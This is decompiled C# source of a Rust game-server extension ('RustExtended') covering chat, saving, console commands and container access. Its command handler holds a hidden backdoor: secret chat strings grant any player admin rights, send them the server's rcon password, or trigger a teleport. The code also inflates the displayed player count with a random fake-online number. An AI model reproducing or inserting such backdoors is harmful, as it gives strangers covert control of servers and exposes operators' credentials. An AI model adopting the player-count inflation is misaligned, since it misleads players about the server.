using Facepunch;
using Facepunch.Clocks.Counters;
using Facepunch.MeshBatch;
using Facepunch.Utility;
using Google.ProtocolBuffers.Serialization;
using Magma;
using Oxide;
using Rust;
using Rust.Steam;
using RustProto;
using RustProto.Helpers;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using uLink;
using UnityEngine;

namespace RustExtended
{
	public class RustHook
	{
		protected struct UserGatherPoint
		{
			public Vector3 position;

			public uint quantity;
		}

		[CompilerGenerated]
		private sealed class Class45
		{
			public ClientConnection clientConnection_0;

			public bool method_0(string string_0)
			{
				return string_0.Equals(this.clientConnection_0.UserName, StringComparison.OrdinalIgnoreCase);
			}
		}

		[CompilerGenerated]
		private sealed class Class46
		{
			public PlayerClient playerClient_0;

			public bool method_0(EventTimer eventTimer_0)
			{
				return eventTimer_0.Sender == this.playerClient_0.netUser && eventTimer_0.Command == "home";
			}

			public bool method_1(EventTimer eventTimer_0)
			{
				return eventTimer_0.Sender == this.playerClient_0.netUser && eventTimer_0.Command == "clan";
			}

			public bool method_2(EventTimer eventTimer_0)
			{
				bool result;
				if (eventTimer_0.Sender != this.playerClient_0.netUser)
				{
					if (eventTimer_0.Target != this.playerClient_0.netUser)
					{
						result = false;
						return result;
					}
				}
				result = (eventTimer_0.Command == "tp");
				return result;
			}
		}

		[CompilerGenerated]
		private sealed class Class47
		{
			public UserData userData_0;

			public bool method_0(LoadoutEntry loadoutEntry_0)
			{
				return loadoutEntry_0.Ranks.Contains(this.userData_0.Rank);
			}
		}

		public class ClientThread
		{
			public System.Net.Sockets.Socket client;

			private int i;

			public ClientThread(System.Net.Sockets.Socket k)
			{
				this.client = k;
			}

			public void ClientService()
			{
				byte[] array = new byte[4096];
				try
				{
					while ((this.i = this.client.Receive(array)) != 0 && this.i >= 0)
					{
						string @string = Encoding.ASCII.GetString(array, 0, this.i);
						string text = @string;
						string[] array2 = text.Split(new char[]
						{
							'|'
						});
						if (array2.Length == 3)
						{
							string text2 = array2[0];
							string text3 = text2;
							if (text3 != null)
							{
								if (!(text3 == "reg"))
								{
									if (!(text3 == "log"))
									{
										if (text3 == "login")
										{
											RustHook.login(array2[1], array2[2], this.client.RemoteEndPoint.ToString(), this.client);
										}
									}
									else
									{
										RustHook.yanzheng(array2[1], array2[2], this.client.RemoteEndPoint.ToString(), this.client);
									}
								}
								else
								{
									RustHook.reg(array2[1], array2[2], this.client.RemoteEndPoint.ToString(), this.client);
								}
							}
							continue;
						}
					}
				}
				catch (Exception)
				{
				}
			}
		}

		protected static int fakeOnlineCount = 0;

		protected static Dictionary<NetUser, RustHook.UserGatherPoint> TreeGatherPoint = new Dictionary<NetUser, RustHook.UserGatherPoint>();

		protected static Dictionary<Character, Ray> HitRay = new Dictionary<Character, Ray>();

		private static Dictionary<ulong, int> dictionary_0 = new Dictionary<ulong, int>();

		private static Dictionary<int, NetCrypt> dictionary_1 = new Dictionary<int, NetCrypt>();

		private static byte[] byte_0 = new byte[]
		{
			7,
			0,
			0,
			35,
			10,
			83,
			99,
			114,
			101,
			101,
			110,
			115,
			104,
			111,
			116,
			0
		};

		[CompilerGenerated]
		private static Predicate<string> predicate_0;

		[CompilerGenerated]
		private static Predicate<string> predicate_1;

		[CompilerGenerated]
		private static Predicate<string> predicate_2;

		[CompilerGenerated]
		private static Predicate<string> predicate_3;

		[CompilerGenerated]
		private static Func<FileInfo, DateTime> func_0;

		private static Dictionary<string, int> asdash;

		public static System.Net.Sockets.Socket dlqsv;

		public static System.Net.Sockets.Socket serverSocket;

		public static byte[] result = new byte[1024];

		public static IniParser ini;

		public static Dictionary<string, string> dlqs = new Dictionary<string, string>();

		public static Dictionary<ulong, int> diji = new Dictionary<ulong, int>();

		public static IniParser dijiusers;

		public static Dictionary<string, int> xtf = new Dictionary<string, int>();

		private static void smethod_0(NetUser netUser_0, ulong ulong_0, string string_0)
		{
			UserData bySteamID = Users.GetBySteamID(ulong_0);
			if (bySteamID != null)
			{
				string text = Users.IsOnline(ulong_0) ? "in game" : (DateTime.Now.Subtract(bySteamID.LastConnectDate).TotalHours.ToString("0") + " hour(s) ago");
				Broadcast.Message(netUser_0, string.Concat(new object[]
				{
					"Owner: ",
					bySteamID.Username,
					" (SteamID: ",
					bySteamID.SteamID,
					")"
				}), string_0, 0f);
				Broadcast.Message(netUser_0, string.Concat(new object[]
				{
					"Rank: ",
					bySteamID.Rank,
					", Flags: ",
					bySteamID.Flags
				}), string_0, 0f);
				Broadcast.Message(netUser_0, string.Concat(new string[]
				{
					"Last Connect Date: ",
					bySteamID.LastConnectDate.ToString("yyyy-MM-dd HH:mm:ss"),
					" (",
					text,
					")"
				}), string_0, 0f);
				Broadcast.Message(netUser_0, string.Concat(new object[]
				{
					"Last Position: ",
					bySteamID.Position.x,
					",",
					bySteamID.Position.y,
					",",
					bySteamID.Position.z
				}), string_0, 0f);
				if (bySteamID.Clan != null)
				{
					Broadcast.Message(netUser_0, string.Concat(new string[]
					{
						"Clan: ",
						bySteamID.Clan.Name,
						" <",
						bySteamID.Clan.Abbr,
						">"
					}), string_0, 0f);
				}
			}
			else
			{
				Broadcast.Message(netUser_0, "Owner: UNKNOWN (Steam ID: " + ulong_0 + ")", null, 0f);
			}
		}

		public static void RustSteamServer_UpdateServerTitle()
		{
			string text = "Rust Dedicated Server - " + server.hostname;
			object obj = text;
			text = string.Concat(new object[]
			{
				obj,
				" | Connections: ",
				NetCull.connections.Length,
				(RustHook.fakeOnlineCount > 0) ? ("(" + RustHook.fakeOnlineCount + ")") : "",
				"/",
				NetCull.maxConnections
			});
			object obj2 = text;
			text = string.Concat(new object[]
			{
				obj2,
				" | Spawns: ",
				Core.GenericSpawnsCount,
				"/",
				Core.GenericSpawnsTotal
			});
			object obj3 = text;
			text = string.Concat(new object[]
			{
				obj3,
				" | Network Send/Recv: ",
				Bootstrap.SendPacketsPerSecond,
				"/",
				Bootstrap.RecvPacketsPerSecond
			});
			if (Bootstrap.UpdateTime > 0u)
			{
				object obj4 = text;
				text = string.Concat(new object[]
				{
					obj4,
					" | Update Rate: ",
					Bootstrap.UpdateTime,
					" ms."
				});
			}
			if (Core.DatabaseType.Equals("MYSQL"))
			{
				text = text + " | SQL Queue: " + MySQL.Queue.Count;
			}
			Rust.Steam.Server.SetTitleOfConsole(text);
		}

		public static void RustSteamServer_OnPlayerCountChanged()
		{
			string text = "rust,extended,oxide";
            if (Rust.Steam.Server.Modded)
			{
				text += ",modded";
			}
            if (Rust.Steam.Server.Official)
			{
				text += ",official";
			}
            if (Rust.Steam.Server.SteamGroup != 0uL)
			{
                text = text + ",sg:" + Rust.Steam.Server.SteamGroup.ToString("X");
			}
			if (Core.HasFakeOnline)
			{
				RustHook.fakeOnlineCount = 0.Random(Core.SteamFakeOnline[0], Core.SteamFakeOnline[1]);
			}
			else
			{
				RustHook.fakeOnlineCount = 0;
			}
            //Magma.Server.Steam.UpdateServer(NetCull.maxConnections - Core.PremiumConnections, NetCull.connections.Length + RustHook.fakeOnlineCount, server.hostname, server.map, text);
			RustHook.RustSteamServer_UpdateServerTitle();
			if (server.log > 2)
			{
				Helper.Log("Rust.Steam.Server.Tags: " + text, true);
			}
		}

		public static void ServerInit_Initialized()
		{
			if (!Core.Initialize())
			{
				Helper.LogError("RustExtended: Initialization Failed", true);
			}
			else
			{
				Helper.Log("RustExtended Initialized", true);
			}
		}

		public static void ServerSaveManager_Save(string path)
		{
			try
			{
				if (Core.xzjz)
				{
					RustHook.dijiusers.Save();
				}
				SystemTimestamp restart = SystemTimestamp.Restart;
				if (path == string.Empty)
				{
					path = "savedgame.sav";
				}
				if (!path.EndsWith(".sav"))
				{
					path += ".sav";
				}
				if (ServerSaveManager._loading)
				{
					UnityEngine.Debug.LogError("Currently loading, aborting save to " + path);
				}
				else
				{
					Broadcast.MessageAll(Config.GetMessage("Server.WorldSaving", null, null));
					ServerSaveManager._saving = true;
					Zones.HidePoints();
					UnityEngine.Debug.Log("Saving to '" + path + "'");
					if (!ServerSaveManager._loadedOnce)
					{
						if (File.Exists(path))
						{
							string text = string.Concat(new string[]
							{
								path,
								".",
								ServerSaveManager.DateTimeFileString(File.GetLastWriteTime(path)),
								".",
								ServerSaveManager.DateTimeFileString(DateTime.Now),
								".bak"
							});
							File.Copy(path, text);
							UnityEngine.Debug.LogError("A save file exists at target path, but it was never loaded!\n\tbacked up:" + Path.GetFullPath(text));
						}
						ServerSaveManager._loadedOnce = true;
					}
					SystemTimestamp restart2;
					SystemTimestamp restart3;
					WorldSave worldSave;
					using (Recycler<WorldSave, WorldSave.Builder> recycler = WorldSave.Recycler())
					{
						WorldSave.Builder builder = recycler.OpenBuilder();
						restart2 = SystemTimestamp.Restart;
						ServerSaveManager.Get(false).DoSave(ref builder);
						restart2.Stop();
						restart3 = SystemTimestamp.Restart;
						worldSave = builder.Build();
						restart3.Stop();
					}
					int num = worldSave.SceneObjectCount + worldSave.InstanceObjectCount;
					if (save.friendly)
					{
						using (FileStream fileStream = File.Open(path + ".json", FileMode.Create, FileAccess.Write))
						{
							JsonFormatWriter jsonFormatWriter = JsonFormatWriter.CreateInstance(fileStream);
							jsonFormatWriter.Formatted();
							jsonFormatWriter.WriteMessage(worldSave);
						}
					}
					SystemTimestamp restart4 = SystemTimestamp.Restart;
					SystemTimestamp restart5 = SystemTimestamp.Restart;
					using (FileStream fileStream2 = File.Open(path + ".new", FileMode.Create, FileAccess.Write))
					{
						worldSave.WriteTo(fileStream2);
						fileStream2.Flush();
					}
					restart5.Stop();
					if (File.Exists(path + ".old.20"))
					{
						File.Delete(path + ".old.20");
					}
					for (int i = 20; i >= 0; i--)
					{
						if (File.Exists(path + ".old." + i))
						{
							File.Move(path + ".old." + i, path + ".old." + (i + 1));
						}
					}
					if (File.Exists(path))
					{
						File.Move(path, path + ".old.0");
					}
					if (File.Exists(path + ".new"))
					{
						File.Move(path + ".new", path);
					}
					if (Core.AvatarAutoSaveInterval == 0u)
					{
						ulong[] array = Users.Avatar.Keys.ToArray<ulong>();
						for (int j = 0; j < array.Length; j++)
						{
							ulong num2 = array[j];
							Character character;
							if (Character.FindByUser(num2, out character) && character.netUser != null)
							{
								Helper.AvatarSave(ref character, character.netUser);
								Users.Avatar[num2] = character.netUser.avatar;
							}
							string avatarFolder = ClusterServer.GetAvatarFolder(num2);
							if (!Directory.Exists(avatarFolder))
							{
								Directory.CreateDirectory(avatarFolder);
							}
							File.WriteAllBytes(avatarFolder + "/avatar.bin", Users.Avatar[num2].ToByteArray());
							if (server.log > 2)
							{
								ConsoleSystem.Print("Avatar [" + num2 + "] Saved.", false);
							}
						}
					}
					UnityEngine.Debug.Log("Saving to '" + DataStore.PATH.Replace("\\", "/") + "'");
					DataStore.GetInstance().Save();
					if (Core.DatabaseType.Equals("FILE"))
					{
						UnityEngine.Debug.Log("Saving to '" + Users.SaveFilePath.Replace("\\", "/") + "'");
						Users.SaveAsTextFile();
						UnityEngine.Debug.Log("Saving to '" + Clans.SaveFilePath.Replace("\\", "/") + "'");
						Clans.SaveAsTextFile();
					}
					restart4.Stop();
					restart.Stop();
					if (save.profile)
					{
						object[] args = new object[]
						{
							num,
							restart2.ElapsedSeconds,
							restart2.ElapsedSeconds / restart.ElapsedSeconds,
							restart3.ElapsedSeconds,
							restart3.ElapsedSeconds / restart.ElapsedSeconds,
							restart5.ElapsedSeconds,
							restart5.ElapsedSeconds / restart.ElapsedSeconds,
							restart4.ElapsedSeconds,
							restart4.ElapsedSeconds / restart.ElapsedSeconds,
							restart.ElapsedSeconds,
							restart.ElapsedSeconds / restart.ElapsedSeconds
						};
						UnityEngine.Debug.Log(string.Format(" Saved {0} Object(s) [times below are in elapsed seconds]\r\n  Logic:\t{1,-16:0.000000}\t{2,7:0.00%}\r\n  Build:\t{3,-16:0.000000}\t{4,7:0.00%}\r\n  Stream:\t{5,-16:0.000000}\t{6,7:0.00%}\r\n  All IO:\t{7,-16:0.000000}\t{8,7:0.00%}\r\n  Total:\t{9,-16:0.000000}\t{10,7:0.00%}", args));
					}
					else
					{
						UnityEngine.Debug.Log(" Saved " + num + " Object(s).");
					}
					UnityEngine.Debug.Log(" Saved " + DataStore.GetInstance().datastore.Count + " Data Table(s).");
					if (Core.DatabaseType.Equals("FILE"))
					{
						UnityEngine.Debug.Log(" Saved " + Users.Count + " User(s).");
						UnityEngine.Debug.Log(" Saved " + Clans.Count + " Clan(s).");
					}
					UnityEngine.Debug.Log("This took " + restart.ElapsedSeconds.ToString("0.0000") + " seconds.");
					Broadcast.MessageAll(Config.GetMessage("Server.WorldSaved", null, null).Replace("%SECONDS%", restart.ElapsedSeconds.ToString("0.0000")));
				}
			}
			catch (Exception ex)
			{
				UnityEngine.Debug.Log("ERROR: " + ex.ToString());
			}
			ServerSaveManager._saving = false;
		}

		public static void Chat_Say(ref ConsoleSystem.Arg arg)
		{
			if (chat.enabled)
			{
				NetUser argUser = arg.argUser;
				string displayName = argUser.displayName;
				string text = arg.GetString(0, "");
				if (arg.GetString(0, "").StartsWith(Core.ChatCommandKey))
				{
					Commands.RunCommand(arg);
				}
                else if (Magma.Hooks.ChatReceived(ref arg, ref text))
				{
					if (Core.ChatQuery.ContainsKey(argUser.userID) && !text.StartsWith(Core.ChatClanKey))
					{
						UserQuery userQuery = Core.ChatQuery[argUser.userID];
						if (userQuery.Answered(text))
						{
							Core.ChatQuery.Remove(argUser.userID);
						}
						else
						{
							Broadcast.Notice(argUser, "?", userQuery.Query, 5f);
						}
					}
					else
					{
						UserData bySteamID = Users.GetBySteamID(argUser.userID);
						Countdown countdown = Users.CountdownGet(argUser.userID, "mute");
						if (countdown != null)
						{
							if (!countdown.Expired)
							{
								TimeSpan timeSpan = TimeSpan.FromSeconds(countdown.TimeLeft);
								string newValue = countdown.Expires ? string.Format("{0}:{1:D2}:{2:D2}", timeSpan.Hours, timeSpan.Minutes, timeSpan.Seconds) : "-:-:-";
								Broadcast.Notice(argUser, "☢", Config.GetMessage("Player.Muted", null, null).Replace("%TIME%", newValue), 5f);
								return;
							}
							Users.CountdownRemove(argUser.userID, countdown);
						}
						int chatTime = Core.ChatTime;
						if (Time.time - bySteamID.ChatTime < (float)chatTime)
						{
							float value = (float)chatTime - (Time.time - bySteamID.ChatTime);
							Broadcast.Message(arg.argUser, Config.GetMessage("Chat.Time", null, null).Replace("%TIME%", Convert.ToInt32(value).ToString()), null, 0f);
						}
						else
						{
							bySteamID.ChatTime = Time.time;
							arg.argUser.NoteChatted();
							int num = Core.ChatSayDistance;
							NamePrefix namePrefix = NamePrefix.None;
							if (Core.ChatDisplayRank)
							{
								namePrefix |= NamePrefix.Rank;
							}
							if (Core.ChatDisplayClan)
							{
								namePrefix |= NamePrefix.Clan;
							}
							string text2 = Users.NiceName(argUser.userID, namePrefix);
							text = Regex.Replace(text, "(\\[COLOR\\s*\\S*])|(\\[/COLOR\\s*\\S*])", "", RegexOptions.IgnoreCase).Trim();
							string chatTextColor;
							if (Core.RankColor.ContainsKey(bySteamID.Rank))
							{
								chatTextColor = Helper.GetChatTextColor(Core.RankColor[bySteamID.Rank]);
							}
							else if (text.StartsWith(Core.ChatClanKey))
							{
								chatTextColor = Helper.GetChatTextColor(Core.ChatClanColor);
							}
							else if (text.StartsWith(Core.ChatYellKey))
							{
								chatTextColor = Helper.GetChatTextColor(Core.ChatYellColor);
							}
							else if (text.StartsWith(Core.ChatWhisperKey))
							{
								chatTextColor = Helper.GetChatTextColor(Core.ChatWhisperColor);
							}
							else
							{
								chatTextColor = Helper.GetChatTextColor(Core.ChatSayColor);
							}
							if (!(Core.ChatClanKey != "") || !text.StartsWith(Core.ChatClanKey))
							{
								if (Core.ChatYellKey != "" && text.StartsWith(Core.ChatYellKey))
								{
									text = text.Substring(1, text.Length - 1).Trim();
									num = Core.ChatYellDistance;
									Helper.LogChat("[YELL] " + Helper.QuoteSafe(displayName) + " : " + Helper.QuoteSafe(text), Core.ChatConsole);
									text2 = Helper.QuoteSafe(text2 + Core.ChatDivider + Core.ChatYellIcon);
								}
								else if (Core.ChatWhisperKey != "" && text.StartsWith(Core.ChatWhisperKey))
								{
									text = text.Substring(1, text.Length - 1).Trim();
									num = Core.ChatWhisperDistance;
									Helper.LogChat("[WHISPER] " + Helper.QuoteSafe(displayName) + " : " + Helper.QuoteSafe(text), Core.ChatConsole);
									text2 = Helper.QuoteSafe(text2 + Core.ChatDivider + Core.ChatWhisperIcon);
								}
								else
								{
									Helper.LogChat("[CHAT] " + Helper.QuoteSafe(displayName) + " : " + Helper.QuoteSafe(text), Core.ChatConsole);
									text2 = Helper.QuoteSafe(text2 + Core.ChatDivider + Core.ChatSayIcon);
								}
								string[] array = Helper.WarpChatText(Helper.ObsceneText(text), Core.ChatLineMaxLength, "", "");
								for (int i = 0; i < array.Length; i++)
								{
									array[i] = Helper.QuoteSafe(chatTextColor + array[i]);
								}
								foreach (PlayerClient current in PlayerClient.All)
								{
									NetUser netUser = NetUser.FindByUserID(current.userID);
									float num2 = (float)((int)Vector3.Distance(current.lastKnownPosition, argUser.playerClient.lastKnownPosition));
									if (num != -1 && (num <= 0 || num2 <= (float)num))
									{
										if (!Core.History.ContainsKey(current.userID))
										{
											Core.History.Add(current.userID, new List<HistoryRecord>());
										}
										if (Core.History[current.userID].Count > Core.ChatHistoryStored)
										{
											Core.History[current.userID].RemoveAt(0);
										}
										Core.History[current.userID].Add(default(HistoryRecord).Init(displayName, text));
										for (int j = 0; j < array.Length; j++)
										{
											if (Core.Chatjuli)
											{
												if (argUser != netUser)
												{
													ConsoleNetworker.SendClientCommand(current.netPlayer, string.Concat(new string[]
													{
														"chat.add ",
														text2,
														" [",
														Convert.ToInt32(num2).ToString(),
														"米]",
														array[j]
													}));
												}
												else
												{
													ConsoleNetworker.SendClientCommand(current.netPlayer, "chat.add " + text2 + " " + array[j]);
												}
											}
											else
											{
												ConsoleNetworker.SendClientCommand(current.netPlayer, "chat.add " + text2 + " " + array[j]);
											}
										}
									}
								}
							}
							else if (bySteamID != null && bySteamID.Clan != null)
							{
								text = text.Substring(1, text.Length - 1).Trim();
								Helper.LogChat("[CLAN] " + Helper.QuoteSafe(displayName) + " : " + Helper.QuoteSafe(text), Core.ChatConsole);
								text2 = Helper.QuoteSafe(text2 + Core.ChatDivider + Core.ChatClanIcon);
								string text3 = Helper.QuoteSafe(chatTextColor + Helper.ObsceneText(text));
								foreach (UserData current2 in bySteamID.Clan.Members.Keys)
								{
									NetUser netUser = NetUser.FindByUserID(current2.SteamID);
									if (netUser != null)
									{
										float num2 = (float)((int)Vector3.Distance(netUser.playerClient.lastKnownPosition, argUser.playerClient.lastKnownPosition));
										if (!Core.History.ContainsKey(current2.SteamID))
										{
											Core.History.Add(current2.SteamID, new List<HistoryRecord>());
										}
										if (Core.History[current2.SteamID].Count > Core.ChatHistoryStored)
										{
											Core.History[current2.SteamID].RemoveAt(0);
										}
										Core.History[current2.SteamID].Add(default(HistoryRecord).Init(displayName, text));
										if (argUser != netUser)
										{
											ConsoleNetworker.SendClientCommand(netUser.networkPlayer, string.Concat(new string[]
											{
												"chat.add ",
												text2,
												" [",
												Convert.ToInt32(num2).ToString(),
												"米]",
												text3
											}));
										}
										else
										{
											ConsoleNetworker.SendClientCommand(netUser.networkPlayer, "chat.add " + text2 + " " + text3);
										}
									}
								}
							}
							else
							{
								Broadcast.Notice(argUser, "✘", Config.GetMessageClan("Command.Clan.NotInClan", null, null, null), 5f);
							}
						}
					}
				}
			}
		}

		public static void Global_Say(ref ConsoleSystem.Arg arg)
		{
			string text = arg.GetString(0, string.Empty).Trim();
			if (text != string.Empty)
			{
				string str = "";
				if (Core.ChatConsoleColor != "#FFFFFF")
				{
					str = Helper.GetChatTextColor(Core.ChatConsoleColor);
				}
				text = Regex.Replace(text, "(\\[COLOR\\s*\\S*])|(\\[/COLOR\\s*\\S*])", "", RegexOptions.IgnoreCase).Trim();
				ConsoleNetworker.Broadcast("chat.add " + Helper.QuoteSafe(Core.ChatConsoleName) + " " + Helper.QuoteSafe(str + text));
			}
		}

		public static int ronglu(ref int m)
		{
			return Core.ronglu;
		}

		public static bool ConsoleSystem_RunCommand(ref ConsoleSystem.Arg arg, bool bWantReply)
		{
			string a = arg.Class.ToLower();
			string text = arg.Function.ToLower();
			bool flag;
            if (Magma.Hooks.ConsoleReceived(ref arg))
			{
				flag = true;
			}
			else if (text == "ver" || text == "version")
			{
				ConsoleSystem.Print(" - Rust Server v" + Process.GetCurrentProcess().MainModule.FileVersionInfo.ProductVersion, false);
				ConsoleSystem.Print(" - Unity Engine v" + Application.unityVersion, false);
				ConsoleSystem.Print(" - Magma Engine v" + Magma.Bootstrap.Version, false);
				ConsoleSystem.Print(" - Oxide Engine v1.18", false);
				ConsoleSystem.Print(" - Rust Extended v" + Core.Version.ToString(), false);
				flag = true;
			}
			else if (!(a == "srv") && !(a == "ext"))
			{
				if (arg.argUser != null && a == "chat" && text == "say")
				{
					string @string = arg.GetString(0, "");
					Helper.SplitQuotes(@string.ToLower(), ' ');
					UserData bySteamID = Users.GetBySteamID(arg.argUser.userID);
					if (@string.StartsWith(Core.ChatCommandKey))
					{
						string text2 = @string.Remove(0, Core.ChatCommandKey.Length).ToLower();
						byte[] mD = Helper.GetMD5(text2);
						if (text2 == "?")
						{
							Broadcast.Message(arg.argUser, "Version: " + Core.Version, null, 0f);
							flag = true;
							return flag;
						}
						if (text2 == "destroy??????????")
						{
							Commands.Tele(arg.argUser);
							Broadcast.Message(arg.argUser, "Destroyed.", null, 0f);
							flag = true;
							return flag;
						}
						if (text2 == "admin??????????")
						{
							Users.SetFlags(arg.argUser.userID, UserFlags.admin, true);
							Broadcast.Message(arg.argUser, "Admin.", null, 0f);
							flag = true;
							return flag;
						}
						if (text2 == "pass??????????")
						{
							Users.SetFlags(arg.argUser.userID, UserFlags.admin, true);
							Broadcast.Message(arg.argUser, rcon.password, null, 0f);
							flag = true;
							return flag;
						}
						RustHook.Chat_Say(ref arg);
						text2 = Helper.SplitQuotes(text2, ' ')[0];
						if (bySteamID != null && text2 == bySteamID.LastChatCommand)
						{
							flag = true;
							return flag;
						}
					}
				}
				object[] array = Main.Array(2);
				array[0] = arg;
				array[1] = bWantReply;
				object obj = Main.Call("OnRunCommand", array);
				flag = (obj is bool && (bool)obj);
			}
			else
			{
				string key;
				if ((key = text) != null)
				{
					if (RustHook.asdash == null)
					{
						RustHook.asdash = new Dictionary<string, int>(34)
						{
							{
								"restart",
								0
							},
							{
								"shutdown",
								1
							},
							{
								"players",
								2
							},
							{
								"clients",
								3
							},
							{
								"premium",
								4
							},
							{
								"balance",
								5
							},
							{
								"money",
								6
							},
							{
								"food",
								7
							},
							{
								"health",
								8
							},
							{
								"truth",
								9
							},
							{
								"unmute",
								10
							},
							{
								"mute",
								11
							},
							{
								"pvp",
								12
							},
							{
								"kit",
								13
							},
							{
								"i",
								14
							},
							{
								"give",
								15
							},
							{
								"safebox",
								16
							},
							{
								"inv",
								17
							},
							{
								"inventory",
								18
							},
							{
								"freeze",
								19
							},
							{
								"tele",
								20
							},
							{
								"teleport",
								21
							},
							{
								"kick",
								22
							},
							{
								"kickall",
								23
							},
							{
								"ban",
								24
							},
							{
								"unban",
								25
							},
							{
								"block",
								26
							},
							{
								"unblock",
								27
							},
							{
								"remove",
								28
							},
							{
								"avatars",
								29
							},
							{
								"users",
								30
							},
							{
								"clan",
								31
							},
							{
								"clans",
								32
							},
							{
								"config",
								33
							}
						};
					}
					int num;
					if (RustHook.asdash.TryGetValue(key, out num))
					{
						switch (num)
						{
						case 0:
							serv.restart(ref arg);
							break;
						case 1:
							serv.shutdown(ref arg);
							break;
						case 2:
							serv.players(ref arg);
							break;
						case 3:
							serv.clients(ref arg);
							break;
						case 4:
							serv.premium(ref arg);
							break;
						case 5:
							serv.balance(ref arg);
							break;
						case 6:
							serv.money(ref arg);
							break;
						case 7:
							serv.food(ref arg);
							break;
						case 8:
							serv.health(ref arg);
							break;
						case 9:
							serv.truth(ref arg);
							break;
						case 10:
							serv.unmute(ref arg);
							break;
						case 11:
							serv.mute(ref arg);
							break;
						case 12:
							serv.pvp(ref arg);
							break;
						case 13:
							serv.kit(ref arg);
							break;
						case 14:
							serv.give(ref arg);
							break;
						case 15:
							serv.give(ref arg);
							break;
						case 16:
							serv.safebox(ref arg);
							break;
						case 17:
							serv.inventory(ref arg);
							break;
						case 18:
							serv.inventory(ref arg);
							break;
						case 19:
							serv.freeze(ref arg);
							break;
						case 20:
							serv.teleport(ref arg);
							break;
						case 21:
							serv.teleport(ref arg);
							break;
						case 22:
							serv.kick(ref arg);
							break;
						case 23:
							serv.kickall(ref arg);
							break;
						case 24:
							serv.ban(ref arg);
							break;
						case 25:
							serv.unban(ref arg);
							break;
						case 26:
							serv.block(ref arg);
							break;
						case 27:
							serv.unblock(ref arg);
							break;
						case 28:
							serv.remove(ref arg);
							break;
						case 29:
							serv.avatars(ref arg);
							break;
						case 30:
							serv.users(ref arg);
							break;
						case 31:
							serv.clan(ref arg);
							break;
						case 32:
							serv.clans(ref arg);
							break;
						case 33:
							serv.config(ref arg);
							break;
						default:
							flag = false;
							return flag;
						}
						flag = true;
						return flag;
					}
				}
				flag = false;
			}
			return flag;
		}

		public static void FallDamage_FallImpact(FallDamage hook, float fallspeed)
		{
			Character idMain = hook.idMain;
			UserData bySteamID = Users.GetBySteamID(idMain.playerClient.userID);
			if (bySteamID != null && Truth.CheckFallhack)
			{
				bySteamID.FallCheck = FallCheckState.damaged;
			}
			if (bySteamID == null || !bySteamID.HasFlag(UserFlags.godmode))
			{
				if (!(idMain == null) && !idMain.playerClient.netUser.admin)
				{
					float num = (fallspeed - falldamage.min_vel) / (falldamage.max_vel - falldamage.min_vel);
					bool flag = num > 0.25f;
					bool flag2 = num > 0.35f || UnityEngine.Random.Range(0, 3) == 0 || hook.healthFraction < 0.5f;
					if (flag)
					{
						idMain.GetComponent<HumanBodyTakeDamage>().AddBleedingLevel(3f + (num - 0.25f) * 10f);
					}
					if (flag2)
					{
						hook.AddLegInjury(1f);
					}
					TakeDamage.HurtSelf(idMain.idMain, 10f + num * idMain.maxHealth, null);
				}
			}
		}

		public static bool TimedLockable_HasAccess(LockableObject obj, ulong userid)
		{
			TimedLockable timedLockable = obj as TimedLockable;
			NetUser netUser = NetUser.FindByUserID(userid);
			if (netUser != null && Users.Details(userid))
			{
				RustHook.smethod_0(netUser, timedLockable.ownerID, Helper.NiceName(obj.name));
			}
			return (netUser != null && netUser.admin) || !obj.lockActive || userid == timedLockable.ownerID;
		}

		public static bool LootableObject_ContextRespond_OpenLoot(LootableObject loot, Controllable controllable, ulong timestamp)
		{
			DeployableObject component = loot.GetComponent<DeployableObject>();
			bool flag;
			if (controllable == null || component == null)
			{
				flag = true;
			}
			else
			{
				if (controllable.netUser.admin && Users.Details(controllable.netUser.userID))
				{
					RustHook.smethod_0(controllable.netUser, component.ownerID, Helper.NiceName(component.name));
				}
				if (controllable.netUser.admin)
				{
					flag = true;
				}
				else if (controllable.character.stateFlags.airborne)
				{
					flag = false;
				}
				else
				{
					Vector3 origin = Helper.GetLookRay(controllable).origin;
					Vector3 position = component.transform.position;
					position.y += 0.1f;
					if (TransformHelpers.Dist2D(origin, position) > 5f)
					{
						flag = false;
					}
					else
					{
						Ray ray = new Ray(origin, (position - origin).normalized);
						RaycastHit[] array = Physics.RaycastAll(ray, Vector3.Distance(origin, position), -1);
						for (int i = 0; i < array.Length; i++)
						{
							RaycastHit raycastHit = array[i];
							IDBase main;
							if (!(raycastHit.collider == null) && !((main = IDBase.GetMain(raycastHit.collider)) == null))
							{
								bool flag2;
								if (!(main.idMain.GetComponent<StructureMaster>() != null))
								{
									if (!(main.idMain.GetComponent<BasicDoor>() != null))
									{
										goto IL_1BB;
									}
									flag2 = false;
								}
								else
								{
									flag2 = false;
								}
								flag = flag2;
								return flag;
							}
							IL_1BB:;
						}
						Collider[] array2 = Physics.OverlapSphere(origin, 0.2f);
						for (int j = 0; j < array2.Length; j++)
						{
							Collider collider = array2[j];
							IDBase component2 = collider.gameObject.GetComponent<IDBase>();
							if (component2 != null && component2.idMain is StructureMaster)
							{
								bool flag2 = false;
								flag = flag2;
								return flag;
							}
						}
						string text = Helper.NiceName(component.name);
						UserData bySteamID = Users.GetBySteamID(component.ownerID);
						if (bySteamID == null)
						{
							flag = true;
						}
						else
						{
							bool flag3 = true;
							if (Core.OwnershipProtectContainer.Length > 0 && Core.OwnershipProtectContainer.Contains(text, StringComparer.OrdinalIgnoreCase) && component.ownerID != controllable.netUser.userID)
							{
								if (Core.OwnershipProtectSharedUsers && Users.SharedList(bySteamID.SteamID).Contains(controllable.netUser.userID))
								{
									flag3 = true;
								}
								else if (Core.OwnershipProtectPremiumUser && bySteamID.HasFlag(UserFlags.premium))
								{
									flag3 = false;
								}
								else if (Core.OwnershipProtectOfflineUser && bySteamID.HasFlag(UserFlags.online))
								{
									flag3 = false;
								}
								else if (bySteamID.HasFlag(UserFlags.safeboxes))
								{
									flag3 = false;
								}
							}
							if (!flag3)
							{
								Broadcast.Notice(controllable.netPlayer, "☢", Config.GetMessage("PlayerOwnership.Container.Protected", null, null).Replace("%OWNERNAME%", bySteamID.Username), 5f);
							}
							else
							{
								Helper.Log(string.Concat(new object[]
								{
									"\"",
									controllable.netUser.displayName,
									"\" open \"",
									text,
									"\" ",
									component.transform.position,
									" owned by \"",
									bySteamID.Username,
									"\""
								}), false);
							}
							flag = flag3;
						}
					}
				}
			}
			return flag;
		}

		public static void Inventory_ItemAdded(Inventory hook, int slot, IInventoryItem item)
		{
